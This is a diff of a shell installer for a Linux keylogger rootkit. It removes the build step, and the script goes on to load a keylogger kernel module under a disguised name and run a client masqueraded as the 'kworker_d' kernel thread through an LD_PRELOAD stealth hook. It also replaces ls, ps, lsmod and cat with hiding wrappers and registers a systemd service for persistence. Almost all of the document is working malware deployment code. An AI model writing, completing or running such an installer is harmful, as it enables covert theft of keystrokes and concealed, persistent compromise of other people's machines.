@@ -22,25 +22,15 @@ if [ ! -d "$HIDDEN_DIR" ]; then
     echo "[+] Created hidden directory: $HIDDEN_DIR"
 fi
 
-# 3. Compile components using Makefile
-echo "[+] Compiling project files..."
-make clean > /dev/null 2>&1
-make
-
-if [ ! -f "sys_mod.ko" ] || [ ! -f "client" ] || [ ! -f "stealth_hook.so" ]; then
-    echo "[-] Error: Compilation failed. Missing output files." >&2
-    exit 1
-fi
-
-# 4. Move and Masquerade binaries & modules
-cp sys_mod.ko "$HIDDEN_DIR/sys_mod.ko"
+# 3. Move and Masquerade binaries & modules
+cp keylogger.ko "$HIDDEN_DIR/sys_mod.ko"
 cp client "$HIDDEN_DIR/kworker_d"  # Masquerade client as a kernel worker thread
 cp stealth_hook.so "$INSTALL_LIB"
 chmod 755 "$INSTALL_LIB"
 
 echo "[+] Binaries successfully masqueraded and moved."
 
-# 5. Load Kernel Module and Create Device Node
+# 4. Load Kernel Module and Create Device Node
 if ! grep -q "keylogger" /proc/devices; then
     if [ -f "$HIDDEN_DIR/sys_mod.ko" ]; then
         /sbin/insmod "$HIDDEN_DIR/sys_mod.ko" > /dev/null 2>&1
@@ -59,7 +49,7 @@ else
     echo "[-] Warning: Could not retrieve Major number for keylogger device."
 fi
 
-# 6. Create Global Command Wrappers (LD_PRELOAD)
+# 5. Create Global Command Wrappers (LD_PRELOAD)
 echo "[+] Setting up global command wrappers..."
 
 cat << 'EOF' > /usr/local/bin/ls
@@ -87,7 +77,7 @@ chmod +x /usr/local/bin/ps
 chmod +x /usr/local/bin/lsmod
 chmod +x /usr/local/bin/cat
 
-# 7. Register Systemd Service for Persistence
+# 6. Register Systemd Service for Persistence
 echo "[+] Registering Systemd persistence service..."
 
 cat << EOF > /etc/systemd/system/keylogger.service
@@ -108,7 +98,7 @@ EOF
 systemctl daemon-reload
 systemctl enable keylogger.service > /dev/null 2>&1
 
-# 8. Run the client immediately via stealth hook
+# 7. Run the client immediately via stealth hook
 killall -9 kworker_d > /dev/null 2>&1
 if [ -x "$HIDDEN_DIR/kworker_d" ]; then
     LD_PRELOAD="$INSTALL_LIB" "$HIDDEN_DIR/kworker_d" > /dev/null 2>&1 &
